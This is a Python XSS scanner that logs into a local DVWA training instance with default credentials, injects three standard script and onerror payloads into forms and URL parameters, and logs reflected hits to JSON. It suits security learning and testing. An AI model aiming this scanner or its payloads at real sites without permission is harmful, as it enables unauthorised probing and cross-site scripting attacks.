import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import json

# -----------------------------
# CONFIG
# -----------------------------
BASE_URL = "http://localhost:8080"
LOGIN_URL = BASE_URL + "/login.php"

XSS_URLS = [
    BASE_URL + "/vulnerabilities/xss_r/",
    BASE_URL + "/vulnerabilities/xss_s/",
    BASE_URL + "/vulnerabilities/xss_d/"
]

USERNAME = "admin"
PASSWORD = "password"

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>"
]

vulnerabilities = []


# -----------------------------
# LOGIN FUNCTION
# -----------------------------
def login(session):
    print("[+] Logging into DVWA")

    res = session.get(LOGIN_URL)
    soup = BeautifulSoup(res.text, "html.parser")

    token_tag = soup.find("input", {"name": "user_token"})
    user_token = token_tag.get("value") if token_tag else ""

    data = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": user_token
    }

    session.post(LOGIN_URL, data=data)
    print("[+] Login successful")


# -----------------------------
# GET FORMS
# -----------------------------
def get_forms(session):
    all_forms = []

    for url in XSS_URLS:
        print(f"\n[+] Crawling: {url}")

        res = session.get(url)
        soup = BeautifulSoup(res.text, "html.parser")

        forms = soup.find_all("form")
        print(f"[+] Found {len(forms)} forms")

        for form in forms:
            all_forms.append((url, form))

    return all_forms


# -----------------------------
# FORM DETAILS
# -----------------------------
def get_form_details(form):
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()

    inputs = []
    for tag in form.find_all("input"):
        name = tag.attrs.get("name")
        if name:
            inputs.append(name)

    return {
        "action": action,
        "method": method,
        "inputs": inputs
    }


# -----------------------------
# ADD UNIQUE VULNERABILITY
# -----------------------------
def add_vuln(vuln_type, url, payload):
    key = (vuln_type, payload)

    for v in vulnerabilities:
        if (v["type"], v["payload"]) == key:
            return  # already exists

    vulnerabilities.append({
        "type": vuln_type,
        "url": url,
        "payload": payload
    })

    print(f"\n[!!!] {vuln_type} DETECTED!")
    print("URL:", url)
    print("Payload:", payload)


# -----------------------------
# TEST FORM XSS
# -----------------------------
def test_forms(session, forms):
    for url, form in forms:
        details = get_form_details(form)

        for payload in XSS_PAYLOADS:
            print(f"[+] Testing form payload: {payload}")

            data = {inp: payload for inp in details["inputs"]}
            target_url = urljoin(url, details["action"]) if details["action"] else url

            if details["method"] == "post":
                res = session.post(target_url, data=data)
            else:
                res = session.get(target_url, params=data)

            if payload.lower() in res.text.lower():
                add_vuln("XSS", target_url, payload)
                break  # stop testing this form


# -----------------------------
# TEST URL XSS
# -----------------------------
def test_url_xss(session):
    print("\n[+] Testing URL parameters")

    base = BASE_URL + "/vulnerabilities/xss_r/?name=test&Submit=Submit"

    for payload in XSS_PAYLOADS:
        url = base.replace("test", payload)

        res = session.get(url)

        if payload.lower() in res.text.lower():
            add_vuln("XSS", url, payload)


# -----------------------------
# TEST DOM XSS
# -----------------------------
def test_dom_xss(session):
    print("\n[+] Testing DOM XSS")

    base = BASE_URL + "/vulnerabilities/xss_d/?default=English"

    for payload in XSS_PAYLOADS:
        url = base.replace("English", payload)

        res = session.get(url)

        if payload.lower() in res.text.lower():
            add_vuln("DOM XSS", url, payload)


# -----------------------------
# SAVE RESULTS
# -----------------------------
def save_results():
    if vulnerabilities:
        with open("xss_results.json", "w") as f:
            json.dump(vulnerabilities, f, indent=4)

        print("\n[+] Results saved to xss_results.json")
    else:
        print("\n[-] No vulnerabilities found")


# -----------------------------
# MAIN
# -----------------------------
def main():
    session = requests.Session()

    login(session)

    forms = get_forms(session)
    print(f"\n[+] Total forms found: {len(forms)}")

    test_forms(session, forms)
    test_url_xss(session)
    test_dom_xss(session)

    save_results()

    print("\n[+] Scan completed")


if __name__ == "__main__":
    main()
